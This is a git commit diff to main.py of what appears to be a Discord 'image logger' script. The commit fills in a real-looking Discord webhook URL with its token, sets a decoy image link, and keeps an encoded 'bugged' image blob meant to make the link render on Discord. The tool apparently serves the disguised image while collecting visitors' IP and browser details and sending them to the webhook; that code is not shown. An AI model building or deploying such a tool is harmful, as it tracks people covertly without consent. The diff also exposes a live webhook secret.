72adda4b79a117f7e4fac7027cf1b9f384d19693
Udud3 <105015880+Udud3@users.noreply.github.com>
2022-07-10 02:20:47 -0400

    Update main.py

--- main.py
+++ main.py
@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/995574734039285801/AnzYDM-QXYLmqg_9V06tMiv2t-uYF08j6t-eQLPHdzjFyhnI5kFoFtagOy7ZeLr3V5XX'
 
-bindata = httpx.get('link to image here').content
+bindata = httpx.get('https://th.bing.com/th/id/OIP.OzoJwkP7cptWiBZzSQRwvQHaE0?w=249&h=180&c=7&r=0&o=5&pid=1.7').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
